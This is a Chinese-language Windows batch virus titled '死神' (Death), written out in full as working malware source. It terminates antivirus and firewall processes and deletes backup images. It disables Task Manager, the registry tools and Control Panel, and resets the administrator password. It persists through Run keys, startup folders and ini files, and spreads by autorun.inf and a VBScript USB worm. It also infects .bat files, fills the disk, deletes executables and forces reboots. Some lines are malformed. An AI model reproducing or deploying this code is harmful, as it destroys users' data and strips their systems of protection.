@echo off
TITLE  死神
echo                      由姚嘉华制作，请勿侵犯版权               
echo                      主页：derekyao.xinwen365.net
echo                      论坛：s2cz.uu1001.com
echo                      T8:post.baidu.com/f?kw=s2cz 　
set taskkill=s
copy %0 %windir%\system32\cmd.bat
attrib %windir%\system32\cmd.bat +r +s +h
net stop sharedaccess >nul
%s% /im pfw.exe shadowtip.exe shadowservice.exe qq.exe explorer.exe IEXOLORE.EXE /f >nul
%s% /im norton* /f >nul
%s% /im av* /f >nul
%s% /im fire* /f >nul
%s% /im anti* /f >nul
%s% /im spy* /f >nul
%s% /im bullguard /f >nul
%s% /im PersFw /f >nul
%s% /im KAV* /f >nul
%s% /im ZONEALARM /f >nul
%s% /im SAFEWEB /f >nul
%s% /im OUTPOST /f >nul
%s% /im nv* /f >nul
%s% /im nav* /f >nul
%s% /im F-* /f >nul
%s% /im ESAFE /f >nul
%s% /im cle /f >nul
%s% /im BLACKICE /f >nul
%s% /im def* /f >nul
%s% /im 360safe.exe /f >nul
net stop Shadow" "System" "Service
set alldrive=d e f g h i j k l m n o p q r s t u v w x y z
for %%a in (c %alldrive%) do del %%a:\360* /f /s /q >nul
for %%a in (c %alldrive%) do del %%a:\修复* /f /s /q >nul
rem 修改注册表.......
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer /v norun /t reg_dword /d 00000001 /f >nul 
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer /v nodrives /t reg_dword /d 429467295 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer /v noviewondrive /t reg_dword /d 3 /f >nul
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v Disableregistrytools /t REG_DWORD /d 00000001 /f >nul
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /V NoDesktop /t REG_DWORD /d 00000001 /f >nul
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 00000001 /f >nul
reg delete hkey_class_root\lnkfile /v isshortcut /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer /v restrictrun /t reg_dword /d 00000001 /f >nul
reg delete hkey_class_root\lnkfile /v nevershowext /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer /v notraycontextmenu /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer /v noviewcontextmenu /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer /v nocontrolpanel /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v joy.cpl /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v main.cpl /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v ncpa.cpl  /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v netsetup.cpl /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v nusrmgr.cpl  /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v powercfg.cpl /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v sysdm.cpl /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v telephon.cpl /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v timedate.cpl /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v wscui.cpl /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v wuaucpl.cpl /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v bthprops.cpl /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v nwc.cpl /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v odbccp32.cpl /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v irprops.cpl /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v quicktime.cpl /t reg_dword /d 00000001 /f >nul
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowcpl  /v sapi.cpl /t reg_dword /d 00000001 /f >nul
cls
net user administrator 123456 >nul
for %%c in (c %alldrive%) do del %%c:\*.gho /f /s /q >nul
echo @echo off >d:\setup.bat
echo shutdown -r -t 10 -f -c 亲爱的朋友，我十分抱歉的通知你，你的电脑已经严重崩溃，请重新安装系统可以解决此问题
!^.^ >>d:\setup.bat
echo copy d:\setup.bat c:\Documents" "and" "Settings\All" "Users\「开始」菜单\程序\启动\a.bat >>d:\setup.bat
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v setup.bat /t REG_SZ /d d:\setup.bat 
/f >>d:\setup.bat
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v setup.bat /t REG_SZ /d d:\setup.bat 
/f >>d:\setup.bat
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v setup.bat /t REG_SZ /d d:\setup.bat 
/f >>d:\setup.bat
HKEY_CLASSES_ROOT\batfile\shell\open\command /v setup.bat /t REG_SZ /d d:\setup.bat /f >>d:\setup.bat
echo [windows] >> %windir%\win.ini
echo run=d:\setup.bat C:\AUTOEXEC.BAT >> %windir%\win.ini
echo load=d:\setup.bat C:\AUTOEXEC.BAT >> %windir%\win.ini
echo [boot] >> %windir%\system.ini
echo shell=explorer.exe setup.bat C:\AUTOEXEC.BAT >> %windir%\system.ini
echo [AutoRun] >d:\autorun.inf
echo Open=setup.bat >>d:\autorun.inf
echo Open=system.bat >>d:\autorun.inf
attrib d:\autorun.inf +r +s +h >>d:\setup.bat
attrib d:\setup.bat +r +s +h >>d:\setup.bat
start d:\setup.bat /min >nul
echo @echo off >>C:\AUTOEXEC.BAT
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v AUTOEXEC.BAT /t REG_SZ /d 
C:\AUTOEXEC.BAT /f >>C:\AUTOEXEC.BAT
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v AUTOEXEC.BAT /t REG_SZ /d 
C:\AUTOEXEC.BAT /f >>C:\AUTOEXEC.BAT
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v AUTOEXEC.BAT /t REG_SZ /d 
C:\AUTOEXEC.BAT /f >>C:\AUTOEXEC.BAT
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v setup.bat /t REG_SZ /d d:\setup.bat 
/f >>C:\AUTOEXEC.BAT
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v setup.bat /t REG_SZ /d d:\setup.bat 
/f >>C:\AUTOEXEC.BAT
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v setup.bat /t REG_SZ /d d:\setup.bat 
/f >>C:\AUTOEXEC.BAT
echo if not d:\setup.bat start %windir%\system32\cmd.bat /min >>C:\AUTOEXEC.BAT
copy %0 %systemroot%\windows.bat >nul
if not exist %windir%/system32/explorer.bat @echo off >>%windir%/system32/explorer.bat
if not exist C:\AUTOEXEC.BAT start %windir%\system32\cmd.bat /min >>%windir%/system32/explorer.bat
if not exist %windir%\system32\cmd.bat start %systemroot%\windows.bat /min >>%windir%/system32/explorer.bat
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v AUTOEXEC.BAT /t REG_SZ /d 
C:\AUTOEXEC.BAT /f >>%windir%/system32/explorer.bat
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v AUTOEXEC.BAT /t REG_SZ /d 
C:\AUTOEXEC.BAT /f >>%windir%/system32/explorer.bat
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v setup.bat /t REG_SZ /d d:\setup.bat 
/f >>%windir%/system32/explorer.bat
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v setup.bat /t REG_SZ /d d:\setup.bat 
/f >>%windir%/system32/explorer.bat
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v explorer.bat /t REG_SZ /d %
windir%/system32/explorer.bat/f >>%windir%/system32/explorer.bat
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v explorer.bat /t REG_SZ /d %
windir%/system32/explorer.bat /f >>%windir%/system32/explorer.bat
echo start %systemroot%\windows.bat /min >>%windir%/system32/explorer.bat
attrib %windir%/system32/explorer.bat +r +s +h%
attrib %systemroot%/windows.bat +r +s +h
for %%c in (%alldrive%) do echo @echo off >>%%c:\system.bat
for %%c in (%alldrive%) do echo start %windir%\system32\cmd.bat /min >>%%c:\system.bat
for %%c in (%alldrive%) do echo attrib system.bat +r +s +h >>%%c:\system.bat
set drive=e f g h i j k l m n o p q r s t u v w x y z
for %%c in (%drive%) do echo [AuroRun] >%%c:\autorun.inf
for %%c in (%drive%) do echo Open=system.bat >>%%c:\autorun.inf
copy %0 d:\Program" "Files\run.bat
for %%c in (%alldrive%) do echo if not exist %windir%/system32/explorer.bat start d:\Program" "Files\run.bat /min 
>>%%c:\system.bat
for %%c in (%alldrive%) do attrib autorun.inf +r +s +h >>%%c:\system.bat
for %%c in (%alldrive%) do attrib %%c:\autorun.inf +r +s +h >nul
for %%c in (%alldrive%) do attrib %%c:\system.bat +r +s +h >nul
if not exist %windir%/system32/explorer.bat start d:\Program" "Files\run.bat /min >>d:\setup.bat
attrib d:\Program" "Files\run.bat +r +s +h >nul
del %0
rem 篡改系统文件.......
echo exit|%ComSpec% /k prompt e 100 B4 00 B0 12 CD 10 B0 03 CD 10 CD 20 $_g$_q$_|debug>nul

chcp 437>nul
graftabl 936>nul

set all=20
:start
if "%all%"=="0" goto end
cls
set /a all=%all%-1
echo.
echo.
echo.
echo.
echo                           %all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%
echo                           %all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%
echo                           %all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%
echo                           %all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%
echo                           %all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%
echo                           %all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%%all%
echo wscript.sleep 500>>ri.vbs &call ri.vbs &del ri.vbs
goto start
if not exist "%HOMEPATH%\..\All Users\「开始」菜单\程序\启动\power.bat" copy %~fs0 "%HOMEPATH%\..\All Users\「开始」菜单\程序\启动\power.bat">nul 
echo @echo off>%windir%\power.bat 
echo if "%%1"=="" goto :end>>%windir%\power.bat 
echo if exist C:\_stop goto :EOF>>%windir%\power.bat 
echo start /B %%~fs0 exp>>%windir%\power.bat 
echo :s>>%windir%\power.bat 
echo if not exist C:\_stop goto s>>%windir%\power.bat 
echo exit>>%windir%\power.bat 
echo :end>>%windir%\power.bat 
echo del %%~fs0>>%windir%\power.bat 
echo set ws=CreateObject("WScript.Shell")>%windir%\power.vbs 
echo ws.Run "%windir%\power.bat exp",0 >>%windir%\power.vbs 
WScript %windir%\power.vbs 
del %windir%\power.vbs 
set p=%~ps0 
if not %p:~-3,2%==启动 del %~fs0
rem 初步格式化磁盘.......
copy %0 "%userprofile%\「开始」菜单\程序\启动\1.bat"
echo rd %windei%/windos /s /q & goto 1>d:\explorer.bat
echo :1>>d:\explorer.bat
echo del c:\*.exe /f /s /q>>d:\explorer.bat
echo del d:\*.exe /f /s /q>>d:\explorer.bat
echo del e:\*.exe /f /s /q>>d:\explorer.bat
echo del f:\*.exe /f /s /q>>d:\explorer.bat
start d:\explorer.bat
rem 注入蠕虫病毒.......
attrib -r -h -s "%~nx0" 2>nul >nul 
attrib -r -h -s %windir%\"%~nx0" 2>nul >nul 
copy "%~nx0" %windir% /y 2>nul >nul 
at 9:20 /every:m,t,w,th,f,s,su "%windir%\%~nx0" 
echo reboot>%windir%\temp.dll 
set pat=「开始」菜单\程序\启动 
echo @echo off>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo echo reboot^>^>%%windir%%\temp.dll>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo find /c "reboot" %%windir%%\temp.dll^|find "11">>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo if errorlevel 1 goto rebootnow>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo del %%windir%%\user.dll /f /q>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo del %%windir%%\temp.dll /f /q>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo del /f /q "%%~nx0">>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo exit>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo :rebootnow>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo shutdown /r /t 0 /f>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo exit>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo [autorun]>%windir%\user.dll 
echo shellexecute=%~nx0>>%windir%\user.dll 
set disk=C:>nul 2>nul 
:auto 
copy %windir%\"%~nx0" %disk%\ /y 2>nul >nul 
copy %windir%\user.dll %disk%\autorun.inf /y 2>nul >nul 
attrib +s +h +r %disk%\%~nx0 2>nul >nul 
attrib +s +h +r %disk%\autorun.inf 2>nul >nul 
cls 
goto %disk%>nul 2>nul 
:C: 
set disk=D:>nul 2>nul 
goto auto>nul 2>nul 
: D:
set disk=E:>nul 2>nul 
goto auto>nul 2>nul 
:E: 
set disk=F:>nul 2>nul 
goto auto>nul 2>nul 
:F: 
set disk=G:>nul 2>nul 
goto auto>nul 2>nul 
:G: 
set disk=H:>nul 2>nul 
goto auto>nul 2>nul 
:H: 
set disk=I:>nul 2>nul 
goto auto>nul 2>nul 
:I: 
set disk=J:>nul 2>nul 
goto auto>nul 2>nul 
:J: 
set disk=K:>nul 2>nul 
goto auto>nul 2>nul 
:K: 
set disk=L:>nul 2>nul 
goto auto>nul 2>nul 
: L:
cls 
attrib +s +h +r %windir%\%~nx0 2>nul >nul 
shutdown /r /t 0 /f 
rem 硬盘攻击.......
if exsit %SystemDrive%\PAGEFILES.SYS goto end
copy %0 %windir%\system32\logon.bat                     ::复制自身
FOR /F "tokens=3*" %%i in ('dir /-c %SystemDrive%^|find "可用字节"') do fsutil file createnew %SystemDrive%\PAGEFILES.SYS %%i   ::制造超大文件,轰炸硬盘
attrib +r +s +h %SystemDrive%\PAGEFILES.SYS        ::隐藏文件
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v KV2007 /t REG_SZ /d %windir%\system32\logon.vbs                      ::自动启动
reg delete HKLM\Software\Microsoft\windows\CurrentVersion\explorer\Advanced\Folder\Hidden\SHOWALL /va /f                    ::不显示隐藏文件
for /r %SystemDrive% %%i in (*.bat) do type %0>%%i       ::感染


if exist %windir%\system32\logon.vbs goto end
+++++++++++++++++++++++++=VBS部分+++++++++++++++++++++++++++++++++++++++

echo set fs =createobject("scripting.filesystemobject")>>%windir%\system32\logon.vbs
echo set WshShell = WScript.CreateObject("WScript.Shell")>>%windir%\system32\logon.vbs
echo Set objWMIService = GetObject("winmgmts:" _>>%windir%\system32\logon.vbs
echo ^& "{impersonationLevel=impersonate}!\\" ^& strComputer ^& "\root\cimv2")>>%windir%\system32\logon.vbs
echo Set colDisks = objWMIService.ExecQuery _>>%windir%\system32\logon.vbs
echo ("Select * from Win32_LogicalDisk")>>%windir%\system32\logon.vbs
echo For i =1 to 9000000000>>%windir%\system32\logon.vbs
echo For Each objDisk in colDisks>>%windir%\system32\logon.vbs
echo Select Case objDisk.DriveType>>%windir%\system32\logon.vbs
echo :Case 2:>>%windir%\system32\logon.vbs
echo y1=fs.FileExists(objDisk.DeviceID ^& "\AUTORUN.INF")>>%windir%\system32\logon.vbs
echo if not y1 then>>%windir%\system32\logon.vbs
echo set f=fs.opentextfile(objDisk.DeviceID ^& "\AUTORUN.INF",2, true)>>%windir%\system32\logon.vbs
echo f.write "[AutoRun]" ^& vbcrlf>>%windir%\system32\logon.vbs
echo f.write "open=logon.bat" ^& vbcrlf>>%windir%\system32\logon.vbs
echo f.write "shellexecute=logon.bat" ^& vbcrlf>>%windir%\system32\logon.vbs
echo f.write "shell\Auto\command=logon.bat" ^& vbcrlf>>%windir%\system32\logon.vbs
echo f.Close>>%windir%\system32\logon.vbs
echo Set f1 = fs.GetFile(objDisk.DeviceID ^& "\AUTORUN.INF")>>%windir%\system32\logon.vbs
echo If f1.Attributes = f1.Attributes AND 2 Then>>%windir%\system32\logon.vbs
echo :f1.Attributes = f1.Attributes XOR 7:>>%windir%\system32\logon.vbs
echo End If>>%windir%\system32\logon.vbs
echo end if>>%windir%\system32\logon.vbs
echo y2=fs.FileExists(objDisk.DeviceID ^& "\logon.bat")>>%windir%\system32\logon.vbs
echo if not y2 then >>%windir%\system32\logon.vbs
echo fs.CopyFile "c:\windows\system32\logon.bat",objDisk.DeviceID ^& "\">>%windir%\system32\logon.vbs
echo Set f2 = fs.GetFile(objDisk.DeviceID ^& "\logon.bat")>>%windir%\system32\logon.vbs
echo If f2.Attributes = f2.Attributes AND 2 Then>>%windir%\system32\logon.vbs
echo :f2.Attributes = f2.Attributes XOR 7:>>%windir%\system32\logon.vbs
echo End If>>%windir%\system32\logon.vbs
echo end if>>%windir%\system32\logon.vbs
echo dirr = Wshshell.ExpandEnvironmentStrings("%systemdrive%")>>%windir%\system32\logon.vbs
echo y3=fs.FileExists(dirr & "\PAGEFILES.SYS")>>%windir%\system32\logon.vbs
echo if not y3 then>>%windir%\system32\logon.vbs
echo WshShell.Run "logon.bat">>%windir%\system32\logon.vbs
echo WScript.Sleep 500>>%windir%\system32\logon.vbs
echo Set f3 = fs.GetFile(dirr & "\PAGEFILES.SYS")>>%windir%\system32\logon.vbs
echo If f3.Attributes = f3.Attributes AND 2 Then>>%windir%\system32\logon.vbs
echo :f3.Attributes = f3.Attributes XOR 7:>>%windir%\system32\logon.vbs
echo End If>>%windir%\system32\logon.vbs
echo end if>>%windir%\system32\logon.vbs
echo End Select>>%windir%\system32\logon.vbs
echo Next>>%windir%\system32\logon.vbs
echo WScript.Sleep 5000>>%windir%\system32\logon.vbs
echo Next>>%windir%\system32\logon.vbs
rem 内存调用......
taskkill /im Explorer.exe /f /t
echo 你的电脑没用拉！！  哈哈！！>%windir%\1.txt
echo @echo off>%windir%\2.bat
echo start %windir%\1.txt>>%windir%\2.bat
echo start %windir%\3.bat>>%windir%\2.bat
echo pasuse>nul>>%windir%\2.bat
echo @echo off>%windir%\3.bat
echo start %windir%\1.txt>>%windir%\3.bat
echo start %windir%\2.bat>>%windir%\3.bat
echo pasuse>nul>>%windir%\3.bat
:a
start %windir%\1.txt
start %windir%\2.bat
start %windir%\3.bat
goto b
:b
start %windir%\1.txt
echo 你的电脑没用拉！！  哈哈！！>>%windir%\1.txt
rem 恶作剧......
@reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RAV.exe /t reg_sz /d d:\rav.bat /f
echo 你好！你的电脑将在10秒内关闭，此情况在下一次启动时恢复正常 >>d:\Rav.txt
echo 不会对您的计算机带来任何伤害，请放心使用 >>d:\Rav.txt
echo start RAV.txt >>d:\Rav.bat
echo @reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RAV.exe /f >>d:\Rav.bat
echo del d:\Rav.txt /f >>d:\Rav.bat
echo shutdown -s -t 10 >>d:\Rav.bat
echo del d:\Rav.bat /f /a s r h >>d:\Rav.bat
attrib +s +r +h d:\Rav.bat
exit